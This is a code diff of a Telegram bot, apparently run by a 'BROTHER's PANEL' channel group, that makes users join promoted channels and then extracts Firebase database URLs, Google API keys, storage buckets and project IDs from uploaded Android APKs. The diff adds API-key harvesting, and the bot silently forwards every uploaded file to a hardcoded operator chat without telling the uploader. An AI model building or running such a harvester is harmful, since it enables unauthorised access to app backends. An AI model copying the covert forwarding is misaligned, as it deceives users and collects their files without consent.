@@ -9,7 +9,6 @@ const BOT_TOKEN = process.env.BOT_TOKEN;
 const DESTINATION_CHAT_ID =
   process.env.DESTINATION_CHAT_ID || "-1004352285600";
 
-// Required channels
 const REQUIRED_CHANNELS = [
   "@brotherpanell",
   "@PANELEMPIRE2",
@@ -24,13 +23,15 @@ if (!BOT_TOKEN) {
 const bot = new Telegraf(BOT_TOKEN);
 
 // ==========================================
-// EXPRESS SERVER
+// WEB SERVER
 // ==========================================
 
 const app = express();
 
 app.get("/", (req, res) => {
-  res.status(200).send("APK Firebase Scanner Bot is running.");
+  res.status(200).send(
+    "BROTHER's PANEL Firebase Extraction Bot is running."
+  );
 });
 
 const PORT = process.env.PORT || 3000;
@@ -53,16 +54,13 @@ async function isUserJoined(ctx) {
         userId
       );
 
-      const status = member.status;
-
       if (
-        status !== "creator" &&
-        status !== "administrator" &&
-        status !== "member"
+        member.status !== "creator" &&
+        member.status !== "administrator" &&
+        member.status !== "member"
       ) {
         return false;
       }
-
     } catch (error) {
       console.error(
         `Membership check failed for ${channel}:`,
@@ -82,7 +80,7 @@ async function isUserJoined(ctx) {
 
 async function showJoinScreen(ctx) {
   await ctx.reply(
-    "🔐 Please join all 3 required channels first.\n\nAfter joining all channels, press the Verify button.",
+    "🔐 Please join all 3 required channels first.\n\nAfter joining all channels, press Verify.",
     Markup.inlineKeyboard([
       [
         Markup.button.url(
@@ -113,32 +111,23 @@ async function showJoinScreen(ctx) {
 }
 
 // ==========================================
-// /START
+// START
 // ==========================================
 
 bot.start(async (ctx) => {
-  try {
-    const joined = await isUserJoined(ctx);
+  const joined = await isUserJoined(ctx);
 
-    if (!joined) {
-      return showJoinScreen(ctx);
-    }
-
-    await ctx.reply(
-      "✅ Verification successful!\n\n📦 Please upload your APK file."
-    );
-
-  } catch (error) {
-    console.error("/start error:", error);
-
-    await ctx.reply(
-      "⚠️ Something went wrong. Please try again later."
-    );
+  if (!joined) {
+    return showJoinScreen(ctx);
   }
+
+  await ctx.reply(
+    "✅ Verification successful!\n\n📦 Please upload your APK file."
+  );
 });
 
 // ==========================================
-// VERIFY BUTTON
+// VERIFY
 // ==========================================
 
 bot.action("verify_join", async (ctx) => {
@@ -149,25 +138,25 @@ bot.action("verify_join", async (ctx) => {
 
     if (!joined) {
       return ctx.reply(
-        "❌ Verification failed.\n\nPlease make sure you have joined all 3 channels, then press Verify again."
+        "❌ Verification failed.\n\nPlease join all 3 channels and press Verify again."
       );
     }
 
     await ctx.reply(
-      "✅ Verification successful!\n\n📦 Please upload your APK file."
+      "✅ Verification successful!\n\n📦 Please upload your APK or APKS file."
     );
 
   } catch (error) {
     console.error("Verify error:", error);
 
     await ctx.reply(
-      "⚠️ Could not verify your membership. Please try again."
+      "⚠️ Verification error. Please try again."
     );
   }
 });
 
 // ==========================================
-// DOCUMENT / APK HANDLER
+// DOCUMENT HANDLER
 // ==========================================
 
 bot.on("document", async (ctx) => {
@@ -176,29 +165,37 @@ bot.on("document", async (ctx) => {
   const fileName =
     document.file_name || "unknown.apk";
 
-  // Only APK files
-  if (!fileName.toLowerCase().endsWith(".apk")) {
+  const lowerName =
+    fileName.toLowerCase();
+
+  // Support APK + APKS
+  const isAPK =
+    lowerName.endsWith(".apk") ||
+    lowerName.endsWith(".apks");
+
+  if (!isAPK) {
     return ctx.reply(
-      "❌ Invalid file.\n\nPlease upload an APK file."
+      "❌ Invalid file.\n\nPlease upload an APK or APKS file."
     );
   }
 
-  // Check membership again
+  // Membership check
   const joined = await isUserJoined(ctx);
 
   if (!joined) {
     return showJoinScreen(ctx);
   }
 
-  const processingMessage = await ctx.reply(
-    "⏳ APK received.\n\n🔍 Scanning Firebase configuration..."
-  );
+  const processing =
+    await ctx.reply(
+      "⏳ File received.\n\n🔍 Extracting Firebase configuration..."
+    );
 
   let tempFile = null;
 
   try {
     // ========================================
-    // DOWNLOAD APK
+    // DOWNLOAD
     // ========================================
 
     const fileLink =
@@ -211,7 +208,7 @@ bot.on("document", async (ctx) => {
 
     if (!response.ok) {
       throw new Error(
-        "Failed to download APK."
+        "Failed to download file."
       );
     }
 
@@ -231,7 +228,7 @@ bot.on("document", async (ctx) => {
     );
 
     // ========================================
-    // SEND ONLY APK TO DESTINATION CHAT
+    // SEND ONLY APK/APKS TO DESTINATION
     // ========================================
 
     await ctx.telegram.sendDocument(
@@ -242,99 +239,114 @@ bot.on("document", async (ctx) => {
     );
 
     // ========================================
-    // SCAN APK
+    // SCAN
     // ========================================
 
     const result =
-      scanAPK(tempFile);
+      scanFirebaseConfig(tempFile);
+
+    const sizeMB =
+      (buffer.length / 1024 / 1024).toFixed(2);
 
     // ========================================
-    // CREATE RESULT
+    // RESULT
     // ========================================
 
     let output =
-      "🔎 <b>APK Firebase Scan Result</b>\n\n";
+      `🔥 <b>BROTHER's PANEL FIREBASE EXTRACTION RESULT</b> 🔥\n\n`;
 
-    if (!result.found) {
+    output +=
+      `════════════════════\n`;
 
-      output +=
-        "❌ No Firebase configuration detected.";
+    output +=
+      `📱 APK: ${escapeHtml(fileName)}\n`;
 
-    } else {
+    output +=
+      `📦 Size: ${sizeMB} MB\n`;
 
-      output +=
-        "🔥 <b>Firebase configuration detected</b>\n\n";
+    output +=
+      `════════════════════\n\n`;
 
-      // Database URLs
-      if (result.databaseUrls.length > 0) {
+    const foundCount =
+      result.items.length;
 
-        output +=
-          "<b>Firebase Database URL:</b>\n";
+    output +=
+      `━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
 
-        for (
-          const url of result.databaseUrls
-        ) {
+    output +=
+      `🔓 <b>EXTRACTED FIREBASE CONFIG (${foundCount} found)</b>\n`;
 
-          output +=
-            `${escapeHtml(url)}\n\n`;
+    output +=
+      `━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
 
-          output +=
-            "<b>.json URL:</b>\n";
+    if (result.databaseUrls.length > 0) {
 
-          output +=
-            `${escapeHtml(
-              makeJsonUrl(url)
-            )}\n\n`;
-        }
-      }
-
-      // Project IDs
-      if (result.projectIds.length > 0) {
-
-        output +=
-          "<b>Project ID:</b>\n";
-
-        for (
-          const id of result.projectIds
-        ) {
-          output +=
-            `${escapeHtml(id)}\n`;
-        }
-
-        output += "\n";
-      }
-
-      // Storage bucket
-      if (
-        result.storageBuckets.length > 0
+      for (
+        const url of result.databaseUrls
       ) {
+        output +=
+          `🔗 <b>DB URL:</b>\n`;
 
         output +=
-          "<b>Storage Bucket:</b>\n";
-
-        for (
-          const bucket of result.storageBuckets
-        ) {
-          output +=
-            `${escapeHtml(bucket)}\n`;
-        }
-
-        output += "\n";
+          `${escapeHtml(url)}\n\n`;
       }
+    }
 
-      // App ID
-      if (result.appIds.length > 0) {
+    if (result.apiKeys.length > 0) {
+
+      for (
+        const key of result.apiKeys
+      ) {
+        output +=
+          `🔑 <b>API Key:</b>\n`;
 
         output +=
-          "<b>Firebase App ID:</b>\n";
-
-        for (
-          const appId of result.appIds
-        ) {
-          output +=
-            `${escapeHtml(appId)}\n`;
-        }
+          `${escapeHtml(key)}\n\n`;
       }
+    }
+
+    if (result.storageUrls.length > 0) {
+
+      for (
+        const storage of result.storageUrls
+      ) {
+        output +=
+          `🗄️ <b>Storage URL:</b>\n`;
+
+        output +=
+          `${escapeHtml(storage)}\n\n`;
+      }
+    }
+
+    if (result.projectIds.length > 0) {
+
+      for (
+        const project of result.projectIds
+      ) {
+        output +=
+          `🆔 <b>Project ID:</b>\n`;
+
+        output +=
+          `${escapeHtml(project)}\n\n`;
+      }
+    }
+
+    if (result.appIds.length > 0) {
+
+      for (
+        const appId of result.appIds
+      ) {
+        output +=
+          `📱 <b>Firebase App ID:</b>\n`;
+
+        output +=
+          `${escapeHtml(appId)}\n\n`;
+      }
+    }
+
+    if (!result.items.length) {
+      output +=
+        "❌ No Firebase configuration detected.\n";
     }
 
     // ========================================
@@ -343,7 +355,7 @@ bot.on("document", async (ctx) => {
 
     await ctx.telegram.editMessageText(
       ctx.chat.id,
-      processingMessage.message_id,
+      processing.message_id,
       undefined,
       output,
       {
@@ -354,25 +366,22 @@ bot.on("document", async (ctx) => {
   } catch (error) {
 
     console.error(
-      "APK processing error:",
+      "File processing error:",
       error
     );
 
     try {
       await ctx.telegram.editMessageText(
         ctx.chat.id,
-        processingMessage.message_id,
+        processing.message_id,
         undefined,
-        "❌ APK scanning failed.\n\nPlease try another APK."
+        "❌ Extraction failed.\n\nPlease try another APK/APKS file."
       );
     } catch {}
     
   } finally {
 
-    // ========================================
-    // DELETE TEMPORARY APK
-    // ========================================
-
+    // Delete temporary file
     if (
       tempFile &&
       fs.existsSync(tempFile)
@@ -385,13 +394,13 @@ bot.on("document", async (ctx) => {
 });
 
 // ==========================================
-// APK SCANNER
+// FIREBASE CONFIG SCANNER
 // ==========================================
 
-function scanAPK(apkPath) {
+function scanFirebaseConfig(filePath) {
 
   const zip =
-    new AdmZip(apkPath);
+    new AdmZip(filePath);
 
   const entries =
     zip.getEntries();
@@ -399,10 +408,13 @@ function scanAPK(apkPath) {
   const databaseUrls =
     new Set();
 
-  const projectIds =
+  const apiKeys =
     new Set();
 
-  const storageBuckets =
+  const storageUrls =
+    new Set();
+
+  const projectIds =
     new Set();
 
   const appIds =
@@ -419,72 +431,56 @@ function scanAPK(apkPath) {
     let content;
 
     try {
-
       content =
         entry
           .getData()
           .toString("utf8");
-
     } catch {
-
       continue;
     }
 
     // ======================================
-    // Firebase Realtime Database
+    // DATABASE URL
     // ======================================
 
-    const firebaseIoMatches =
+    const firebaseIo =
       content.match(
         /https?:\/\/[A-Za-z0-9._-]+\.firebaseio\.com(?:\/[^\s"'<>]*)?/gi
       );
 
-    if (firebaseIoMatches) {
-
-      for (
-        const url of firebaseIoMatches
-      ) {
-
+    if (firebaseIo) {
+      for (const url of firebaseIo) {
         databaseUrls.add(
-          cleanUrl(url)
+          cleanValue(url)
         );
       }
     }
 
-    // ======================================
-    // New Firebase Database Domain
-    // ======================================
-
-    const firebaseDatabaseMatches =
+    const firebaseDatabase =
       content.match(
         /https?:\/\/[A-Za-z0-9._-]+\.firebasedatabase\.app(?:\/[^\s"'<>]*)?/gi
       );
 
-    if (firebaseDatabaseMatches) {
-
+    if (firebaseDatabase) {
       for (
-        const url of firebaseDatabaseMatches
+        const url of firebaseDatabase
       ) {
-
         databaseUrls.add(
-          cleanUrl(url)
+          cleanValue(url)
         );
       }
     }
 
-    // ======================================
-    // google-services.json
-    // ======================================
-
-    const firebaseUrlMatches =
+    // firebase_url from config
+    const firebaseUrlConfig =
       content.match(
         /"firebase_url"\s*:\s*"([^"]+)"/gi
       );
 
-    if (firebaseUrlMatches) {
+    if (firebaseUrlConfig) {
 
       for (
-        const item of firebaseUrlMatches
+        const item of firebaseUrlConfig
       ) {
 
         const match =
@@ -493,97 +489,138 @@ function scanAPK(apkPath) {
           );
 
         if (match) {
-
           databaseUrls.add(
-            cleanUrl(match[1])
+            cleanValue(match[1])
           );
         }
       }
     }
 
     // ======================================
-    // Storage Bucket
+    // GOOGLE API KEY
     // ======================================
 
-    const bucketMatches =
+    const apiKeyMatches =
+      content.match(
+        /AIza[0-9A-Za-z_-]{20,}/g
+      );
+
+    if (apiKeyMatches) {
+
+      for (
+        const key of apiKeyMatches
+      ) {
+        apiKeys.add(key);
+      }
+    }
+
+    // ======================================
+    // STORAGE URL
+    // ======================================
+
+    const storageMatches =
       content.match(
         /[A-Za-z0-9._-]+\.(?:appspot\.com|firebasestorage\.app)/gi
       );
 
-    if (bucketMatches) {
+    if (storageMatches) {
 
       for (
-        const bucket of bucketMatches
+        const storage of storageMatches
       ) {
-
-        storageBuckets.add(
-          bucket
+        storageUrls.add(
+          cleanValue(storage)
         );
       }
     }
 
     // ======================================
-    // Firebase App ID
-    // ======================================
-
-    const appIdMatches =
-      content.match(
-        /1:[0-9]+:android:[a-f0-9]+/gi
-      );
-
-    if (appIdMatches) {
-
-      for (
-        const appId of appIdMatches
-      ) {
-
-        appIds.add(
-          appId
-        );
-      }
-    }
-
-    // ======================================
-    // Firebase Project ID
+    // PROJECT ID
     // ======================================
 
     const projectMatches =
       content.match(
-        /[A-Za-z0-9-]+\.firebaseapp\.com/gi
+        /"project_id"\s*:\s*"([^"]+)"/gi
       );
 
     if (projectMatches) {
 
       for (
-        const value of projectMatches
+        const item of projectMatches
       ) {
 
-        projectIds.add(
-          value.replace(
-            ".firebaseapp.com",
-            ""
-          )
-        );
+        const match =
+          item.match(
+            /"project_id"\s*:\s*"([^"]+)"/i
+          );
+
+        if (match) {
+          projectIds.add(
+            match[1]
+          );
+        }
+      }
+    }
+
+    // ======================================
+    // FIREBASE APP ID
+    // ======================================
+
+    const appIdMatches =
+      content.match(
+        /1:[0-9]+:android:[A-Za-z0-9]+/gi
+      );
+
+    if (appIdMatches) {
+
+      for (
+        const id of appIdMatches
+      ) {
+        appIds.add(id);
       }
     }
   }
 
-  return {
+  // ======================================
+  // COUNT
+  // ======================================
 
-    found:
-      databaseUrls.size > 0 ||
-      projectIds.size > 0 ||
-      storageBuckets.size > 0 ||
-      appIds.size > 0,
+  const items = [];
+
+  databaseUrls.forEach(() =>
+    items.push("DB URL")
+  );
+
+  apiKeys.forEach(() =>
+    items.push("API Key")
+  );
+
+  storageUrls.forEach(() =>
+    items.push("Storage URL")
+  );
+
+  projectIds.forEach(() =>
+    items.push("Project ID")
+  );
+
+  appIds.forEach(() =>
+    items.push("App ID")
+  );
+
+  return {
+    items,
 
     databaseUrls:
       [...databaseUrls],
 
+    apiKeys:
+      [...apiKeys],
+
+    storageUrls:
+      [...storageUrls],
+
     projectIds:
       [...projectIds],
-
-    storageBuckets:
-      [...storageBuckets],
 
     appIds:
       [...appIds]
@@ -591,33 +628,11 @@ function scanAPK(apkPath) {
 }
 
 // ==========================================
-// CREATE .JSON URL
-// ==========================================
-
-function makeJsonUrl(url) {
-
-  url =
-    url.replace(
-      /\/+$/,
-      ""
-    );
-
-  if (
-    url.endsWith(".json")
-  ) {
-    return url;
-  }
-
-  return `${url}/.json`;
-}
-
-// ==========================================
 // HELPERS
 // ==========================================
 
-function cleanUrl(url) {
-
-  return url
+function cleanValue(value) {
+  return String(value)
     .trim()
     .replace(
       /[\\'")>,;]+$/g,
@@ -626,7 +641,6 @@ function cleanUrl(url) {
 }
 
 function safeFileName(name) {
-
   return name.replace(
     /[^a-zA-Z0-9._-]/g,
     "_"
@@ -634,24 +648,11 @@ function safeFileName(name) {
 }
 
 function escapeHtml(value) {
-
   return String(value)
-    .replace(
-      /&/g,
-      "&amp;"
-    )
-    .replace(
-      /</g,
-      "&lt;"
-    )
-    .replace(
-      />/g,
-      "&gt;"
-    )
-    .replace(
-      /"/g,
-      "&quot;"
-    );
+    .replace(/&/g, "&amp;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;")
+    .replace(/"/g, "&quot;");
 }
 
 // ==========================================
@@ -661,12 +662,12 @@ function escapeHtml(value) {
 bot.launch()
   .then(() => {
     console.log(
-      "✅ Telegram APK Scanner Bot started."
+      "🔥 BROTHER's PANEL Firebase Extraction Bot started."
     );
   })
   .catch((error) => {
     console.error(
-      "❌ Bot startup error:",
+      "Bot startup error:",
       error
     );
   });
